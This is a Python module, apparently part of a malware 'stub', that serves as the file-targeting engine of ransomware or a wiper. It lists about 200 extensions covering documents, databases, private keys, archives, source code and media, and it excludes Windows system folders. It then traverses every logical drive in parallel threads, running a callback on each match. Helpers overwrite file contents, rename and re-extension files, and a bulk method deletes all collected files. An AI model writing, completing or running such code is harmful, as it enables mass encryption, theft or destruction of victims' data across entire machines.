from typing import MutableSet, Callable, List, FrozenSet
from typing_extensions import Self
from stub.utils import except_pass
from dataclasses import dataclass
from ctypes import windll
from pathlib import Path
from io import BytesIO
import threading
import string
import os

__all__ = ["File", "Filer", "ALLOWED_EXTENSIONS"]
# fmt: off
# https://gist.github.com/xpn/facb5692980c14df2 b16a4ee6a29d5
ALLOWED_EXTENSIONS: FrozenSet[str] = frozenset({
    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott",
    ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc",
    ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop",
    ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3",
    ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd",
    ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas",
    ".h", ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs", ".vb", ".pl", ".dip",
    ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class",
    ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf",
    ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u",
    ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw",
    ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar",
    ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg",
    ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt",
    ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx",
    ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx",
    ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm",
    ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm",
    ".docb", ".docx", ".doc", ".py", ".go"
})
# Case insensitive set
UNALLOWED_DIRS: FrozenSet[str] = frozenset(map(str.lower, {
    "ProgramData",
    "Local",
    "Windows",
    "bootmgr",
    "$WINDOWS.~BT",
    "Windows.old",
    "Temp",
    "tmp",
    "Program Files",
    "Program Files (x86)",
    "AppData",
    "$Recycle.Bin",
}))
# fmt: on


@dataclass
class File:
    path: str
    name: str | None = None
    size: int | None = None
    content: BytesIO | None = None
    extension: str | None = None  # With the leading dot
    path_obj: Path | None = None

    def __post_init__(self) -> None:
        self.content = None
        self.name = os.path.basename(self.path).split(".")[0]
        self.size = os.path.getsize(self.path)
        self.path_obj = Path(self.path)
        self.extension = self.path_obj.suffix

    def rename(self, name: str, /) -> Self:
        new_path = os.path.join(os.path.dirname(self.path), name)
        os.rename(self.path, new_path)
        self.path = new_path
        self.name = name
        return self

    def change_extension(self, extension: str, /) -> Self:
        path = f"{Path(self.path).stem}.{extension}"
        self.rename(path)
        self.extension = extension
        return self

    def read_content(self) -> BytesIO:
        with open(self.path, "rb") as f:
            return BytesIO(f.read())

    def change_content(self, content: bytes, /) -> Self:
        self.content = BytesIO(content)
        self.size = len(content)
        with open(self.path, "wb") as f:
            f.write(content)
        return self

    def delete(self) -> None:
        os.remove(self.path)


class Filer:
    def __init__(self) -> None:
        self.files: List[File] = []
        self.lock = threading.Lock()

    @property
    def paths(self) -> List[str]:
        return [f.path for f in self.files]

    @except_pass
    def _inner_traverse(
        self,
        entry: os.DirEntry[str],
        apply: Callable[[File], None] | None = None,
        /,
        m: List[File] | None = None,
        *,
        include_all: bool = False,
    ) -> None:
        if entry.is_file():
            _allowed = include_all or Path(entry.path).suffix in ALLOWED_EXTENSIONS
            if not _allowed:
                return

            if apply is not None and callable(apply):
                apply(File(entry.path))

            with self.lock:
                self.files.append(File(entry.path)) if m is None else m.append(
                    File(entry.path)
                )

        elif entry.is_dir() and entry.name.lower() not in UNALLOWED_DIRS:
            self.traverse(entry.path, apply, m=m, include_all=include_all)

    def traverse(
        self,
        root_dir: str,
        apply: Callable[[File], None] | None = None,
        /,
        m: List[File] | None = None,
        *,
        include_all: bool = False,
    ) -> None:
        """Recursively traverse a directory"""
        for entry in os.scandir(root_dir):
            self._inner_traverse(entry, apply, m=m, include_all=include_all)

    def get_drives(self):
        drives = []
        bitmask = windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drives.append(letter)
            bitmask >>= 1

        return drives

    def traverse_all(self, apply: Callable[[File], None] | None = None) -> None:
        """Traverse all drives on the system using threads"""
        drives = self.get_drives()

        threads = []
        for drive in drives:
            thread = threading.Thread(
                target=self._traverse_drive,
                args=(
                    drive,
                    apply,
                ),
            )
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

    def _traverse_drive(self, drive: str, apply: Callable[[File], None] | None) -> None:
        drive_path = f"{drive}:\\"
        if os.path.exists(drive_path):
            self.traverse(drive_path, apply)

    def delete_files(self) -> None:
        for file in self.files:
            file.delete()
